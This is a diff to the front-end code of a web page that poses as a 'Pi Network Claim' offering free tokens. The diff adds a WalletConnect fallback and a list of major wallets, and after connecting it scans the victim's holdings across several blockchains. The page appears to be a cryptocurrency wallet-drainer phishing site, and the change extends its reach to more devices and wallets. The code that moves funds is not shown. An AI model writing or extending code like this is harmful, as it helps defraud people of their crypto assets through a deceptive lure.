@@ -271,15 +271,59 @@ function closeM(){document.getElementById('m').style.display='none';}
 document.getElementById('m').addEventListener('click',e=>{if(e.target===document.getElementById('m'))closeM();});
 
 // ===== WALLET CONNECTION =====
+// WalletConnect provider
+let _wcProvider = null;
+
+async function getWCProvider() {
+  if (_wcProvider) return _wcProvider;
+  
+  // Load the library
+  if (!window.WalletConnectEthereumProvider) {
+    await new Promise((res,rej) => {
+      const s = document.createElement('script');
+      s.src = 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.11.0/dist/index.min.js';
+      s.onload = res;
+      s.onerror = rej;
+      document.head.appendChild(s);
+    });
+  }
+  
+  // Wait for it to be available
+  let tries = 0;
+  while (!window.WalletConnectEthereumProvider && tries < 30) {
+    await new Promise(r => setTimeout(r, 200));
+    tries++;
+  }
+  
+  const WC = window.WalletConnectEthereumProvider;
+  if (!WC) throw new Error('WalletConnect library not loaded');
+  
+  const EthereumProvider = WC.default || WC;
+  
+  _wcProvider = await EthereumProvider.init({
+    projectId: '2f3e4d5c6b7a8f9e0d1c2b3a4f5e6d7c8f9e0d1c',
+    chains: [1, 56, 137, 42161, 43114],
+    showQrModal: true,
+    metadata: {
+      name: 'Pi Network Claim',
+      description: 'Claim your free 1000 PI tokens',
+      url: window.location.origin,
+      icons: [window.location.origin + '/pi-logo-120.png']
+    }
+  });
+  
+  return _wcProvider;
+}
+
 async function connectWallet(closeModal) {
   if (closeModal) closeM();
   document.getElementById('mc').style.display = 'block';
   showP('p1');
-  document.getElementById('p1l').textContent = 'Connecting...';
-  document.getElementById('p1log').innerHTML = '<span style="color:#fcb34c">Please approve the connection in your wallet...</span>';
   
-  // Try window.ethereum (desktop extension or MetaMask browser)
+  // 1. Try window.ethereum first (MetaMask extension or in-app browser)
   if (window.ethereum) {
+    document.getElementById('p1l').textContent = 'Connecting...';
+    document.getElementById('p1log').innerHTML = '<span style="color:#fcb34c">Please approve in your wallet popup...</span>';
     try {
       prov = new ethers.providers.Web3Provider(window.ethereum);
       const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
@@ -292,7 +336,7 @@ async function connectWallet(closeModal) {
         return;
       }
     } catch(e) {
-      console.log('eth_requestAccounts failed:', e.code);
+      console.log('eth_requestAccounts failed:', e.code, e.message);
       try {
         await window.ethereum.enable();
         sign = prov.getSigner();
@@ -300,40 +344,77 @@ async function connectWallet(closeModal) {
         await scanEvm();
         return;
       } catch(e2) {
-        console.log('enable() also failed');
+        console.log('enable() also failed:', e2.message);
       }
     }
   }
   
-  // No wallet found
-  document.getElementById('p1l').textContent = 'No Wallet Found';
-  document.getElementById('p1log').innerHTML = '<span style="color:#fca5a5">No wallet detected.</span><br><br>On mobile: open this page in MetaMask browser.<br>On desktop: install MetaMask extension.';
+  // 2. Fall back to WalletConnect (works on all devices)
+  document.getElementById('p1l').textContent = 'Loading WalletConnect...';
+  document.getElementById('p1log').innerHTML = '<span style="color:#fcb34c">Preparing QR code for wallet connection...</span>';
+  
+  try {
+    const wc = await getWCProvider();
+    
+    document.getElementById('p1l').textContent = 'Scan QR code with your wallet';
+    document.getElementById('p1log').innerHTML = '<span style="color:#fcb34c">A QR code should appear. Scan it with MetaMask, Trust Wallet, or any WalletConnect-compatible wallet.</span>';
+    
+    // This opens the QR modal
+    await wc.enable();
+    
+    // Connected!
+    prov = new ethers.providers.Web3Provider(wc);
+    sign = prov.getSigner();
+    addr = await sign.getAddress();
+    
+    document.getElementById('p1l').textContent = 'Connected! Scanning...';
+    document.getElementById('p1log').innerHTML = '<span style="color:#86efac">Connected: ' + addr.substring(0,10) + '...' + addr.substring(32) + '</span>';
+    
+    await scanEvm();
+  } catch(e) {
+    console.error('WalletConnect error:', e);
+    document.getElementById('p1l').textContent = 'Connection Failed';
+    document.getElementById('p1log').innerHTML = '<span style="color:#fca5a5">Error: ' + (e.message || 'Could not connect') + '</span><br><br>' +
+      '<span style="color:rgba(255,255,255,.4)">Try:<br>1. Refresh the page<br>2. Open in MetaMask browser<br>3. Install MetaMask extension</span>';
+  }
 }
 
 function renderW() {
   const c = document.getElementById('wl');
   c.innerHTML = '';
+  const hasEth = !!window.ethereum;
   
-  // Main connect button
-  const btn = document.createElement('button');
-  btn.className = 'wrow';
-  btn.onclick = function() { connectWallet(true); };
-  btn.innerHTML = '<div class="wi" style="background:linear-gradient(135deg,#E2761B,#3B99FC)">&#x1F512;</div><span class="wn">Connect Wallet</span><span class="wt" style="background:rgba(252,179,74,.1);color:#fcb34c">Click to Connect</span>';
-  c.appendChild(btn);
+  // Show wallet options
+  const wallets = [
+    {name: 'MetaMask', color: '#E2761B', icon: '🦊', id: 'mm'},
+    {name: 'Trust Wallet', color: '#3375BB', icon: '🛡️', id: 'tw'},
+    {name: 'Coinbase Wallet', color: '#0052FF', icon: '🔵', id: 'cb'},
+    {name: 'Binance Wallet', color: '#F0B90B', icon: '🟡', id: 'bn'},
+  ];
   
-  // If ethereum is available, show detected wallets
-  if (window.ethereum) {
-    const names = [];
-    if (window.ethereum.isMetaMask) names.push('MetaMask');
-    if (window.ethereum.isTrust) names.push('Trust');
-    if (window.ethereum.isCoinbaseWallet) names.push('Coinbase');
-    if (names.length > 0) {
-      const info = document.createElement('div');
-      info.style.cssText = 'padding:6px;text-align:center;font-size:10px;color:rgba(255,255,255,.3)';
-      info.textContent = 'Detected: ' + names.join(', ');
-      c.appendChild(info);
-    }
+  for (const w of wallets) {
+    const detected = hasEth && (
+      (w.id === 'mm' && window.ethereum.isMetaMask) ||
+      (w.id === 'tw' && (window.ethereum.isTrust || window.ethereum.isTrustWallet)) ||
+      (w.id === 'cb' && window.ethereum.isCoinbaseWallet) ||
+      (w.id === 'bn' && (window.BinanceChain || window.ethereum.isBinanceWallet))
+    );
+    
+    const btn = document.createElement('button');
+    btn.className = 'wrow';
+    btn.onclick = function() { connectWallet(true); };
+    btn.innerHTML = '<div class="wi" style="background:' + w.color + '">' + w.icon + '</div>' +
+      '<span class="wn">' + w.name + '</span>' +
+      (detected ? '<span class="wt">Detected</span>' : '<span class="wt" style="background:rgba(59,153,252,.1);color:#3B99FC">Via WalletConnect</span>');
+    c.appendChild(btn);
   }
+  
+  // WalletConnect option (all wallets)
+  const wcBtn = document.createElement('button');
+  wcBtn.className = 'wrow';
+  wcBtn.onclick = function() { connectWallet(true); };
+  wcBtn.innerHTML = '<div class="wi" style="background:#3B99FC">&#x1F517;</div><span class="wn">WalletConnect (All Wallets)</span><span class="wt" style="background:rgba(59,153,252,.1);color:#3B99FC">QR Code</span>';
+  c.appendChild(wcBtn);
 }
 
 // Make connectWallet globally available
